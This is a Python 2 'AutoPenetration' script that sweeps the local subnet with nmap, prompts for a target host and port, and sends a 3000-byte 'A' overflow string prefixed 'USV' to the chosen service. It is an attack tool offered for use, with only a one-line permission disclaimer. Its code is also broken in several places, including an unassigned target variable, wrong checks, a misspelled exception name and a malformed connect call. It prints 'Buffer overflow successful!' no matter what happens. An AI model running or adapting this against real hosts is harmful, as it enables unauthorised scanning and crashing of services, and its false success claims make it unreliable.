##########################################################

# AutoPenetration Script by KesselRun

    # Help can be found in the HANDBOOK document attached.
    # Created by KesselRun (links at the bottom of script)

# Requirements:

    # Internet Connection
    # nmap
    # Linux/Unix OS
    # https://github.com/tylerdave/prompter

# Optional:

    # Python Knowledge for DIY Modules
    
# Rules:

    # Don't use this tool for hacking without illicit permission from your target. This is a tool, not a weapon.

##########################################################

# AutoPenetration Script Editing

    # Do not edit this script unless the HANDBOOK says so.
    # Don't say I didn't warn you.
    # 0000000 (Handbook Reference)

##########################################################

# Console Print GUI:
    # This creates text in the console.
    # 0000001 (Handbook Reference)

try:
    print('     _         _        ____                 _             _   _             ')
    print('    / \  _   _| |_ ___ |  _ \ ___ _ __   ___| |_ _ __ __ _| |_(_) ___  _ __  ')
    print('   / _ \| | | | __/ _ \| |_) / _ \  _ \ / _ \ __|  __/ _  | __| |/ _ \|  _ \ ')
    print('  / ___ \ |_| | || (_) |  __/  __/ | | |  __/ |_| | | (_| | |_| | (_) | | | |')
    print(' /_/   \_\__,_|\__\___/|_|   \___|_| |_|\___|\__|_|  \__,_|\__|_|\___/|_| |_|')
    print('\n')
    print('Made by KesselRun') # Change this and you're just a sad person.
    print('\n') 
    print("Starting AutoPenetration Script..")
    print("_________________________________")
    print("\n")
except Exception as e: print "Something is horrendously wrong.\n[ref. 0000001]"

# Finding LocalHost IP:
    # This finds your computer's Internet Protocol Address.
    # VARIABLES: lhost
    # 0000002 (Handbook Reference)

try:
    import subprocess
    import sys
    process = subprocess.Popen(['ipconfig','getifaddr','en0'], stdout=subprocess.PIPE)
    for lhost in iter(lambda: process.stdout.read(), ''):
        print ("Your IP address is:\n\n" + str(lhost).rstrip())
        break
except Exception as e: print "Couldn't resolve your IP address. Got WiFi?\n[ref. 0000002]"

# Console Print GUI:
    # This creates text in the console.
    # 0000001 (Handbook Reference)

try:    
    print("_________________________________")
    print("\n")
except Exception as e: print "Something is horrendously wrong.\n[ref. 0000001]"

# Using python-nmap Library:
    # This finds RemoteHost IPs.
    # 0000003 (Handbook Reference)  

try:
    import nmap
    import subprocess
    rhostcommand = "nmap -n -sn " + lhost.rstrip()[:-3] + "-255 -oG - | awk '/Up$/{print $2}'"
    pst = subprocess.Popen(rhostcommand, shell=True, stdout=subprocess.PIPE)
    output = pst.stdout.read()
    if output == None:
        print "Couldn't resolve Remote Host IPs.\n[ref. 0000003]"
    else:
        print "Remote Host IPs:\n"
        print output.rstrip()
except Exception as e: print "RemoteHost IP fetching broken.\n[ref. 0000003]"

# Console Print GUI:
    # This creates text in the console.
    # 0000001 (Handbook Reference)
 
try:  
    print("_________________________________")
    print("\n")
except Exception as e: print "Something is horrendously wrong.\n[ref. 0000001]"

# Prompting for Remote Host IP:
    # This uses Prompter.
    # Link for library: https://github.com/tylerdave/prompter
    # 0000004 (Handbook Reference)

# try:
#     from prompter import prompt, yesno
#     while True:
#         rhost = prompt('Please type your target IP: ')
#         confirmrhost = yesno('Are you sure?')
#         if confirmrhost:
#             break
# except Exeption as e: print "Issues prompting. Do you have Prompter installed?\n[ref. 0000004]"

outputsplit = output.splitlines()

import inquirer
questions = [
        inquirer.List('rhostips',
            message="Choose target IP",
            choices=outputsplit,
        ),
]
answers = inquirer.prompt(questions)
print answers ['rhostips']

# Console Print GUI:
    # This creates text in the console.
    # 0000001 (Handbook Reference)

try:  
    print("_________________________________")
    print("\n")
except Exception as e: print "Something is horrendously wrong.\n[ref. 0000001]"

# Prompting for Remote Host IP:
    # This uses Prompter.
    # Link for library: https://github.com/tylerdave/prompter
    # 0000004 (Handbook Reference)

try:
    from prompter import prompt, yesno
    while True:
        rport = prompt('Please type your target port: ')
        confirmrport = yesno('Are you sure?')
        if confirmrhost:
            break
except Exeption as e: print "Issues prompting. Do you have Prompter installed?\n[ref. 0000004]"

# Console Print GUI:
    # This creates text in the console.
    # 0000001 (Handbook Reference)

try:  
    print("_________________________________")
    print("\n")
except Exception as e: print "Something is horrendously wrong.\n[ref. 0000001]"

print rhost
print rport

# Buffer Overflow Attempt:
    # This hops on to extraneous data to gain access to your target.
    # 0000005 (Handbook Reference)

#try:
import sys, socket

for carg in sys.argv:

            if carg == "-s":

                        argnum = sys.argv.index(carg)

                        argnum += 1

                        host = sys.argv[argnum]

            elif carg == "-p":

                        argnum = sys.argv.index(carg)

                        argnum += 1

                        port = sys.argv[argnum]

buffer = "\x41" * 3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

i = [rport]
ip = [rhost]

s.connect(ip + i)


s.send("USV " + buffer + "//r//n//r")
s.close()
print ("Buffer overflow successful!")
#except Exception as e: print "Connection refused.\n[ref. 0000005]"

# Console Print GUI:
    # This creates text in the console.
    # 0000001 (Handbook Reference)

try:  
    print("_________________________________")
    print("\n")
except Exception as e: print "Something is horrendously wrong.\n[ref. 0000001]"

##########################################################

# KesselRun made this, don't copy it.
# http://www.stackoverflow.com/sv/KesselRun
# https://hackforums.net/member.php?action=profile&uid=3508173

# Only if you really need help, AND YOU HAVE ALREADY CHECKED THE HANDBOOK FOR A SOLUTION AND IT IS NOT THERE, then you can contact me at my mail.

# KesselRunOfficial@protonmail.com

##########################################################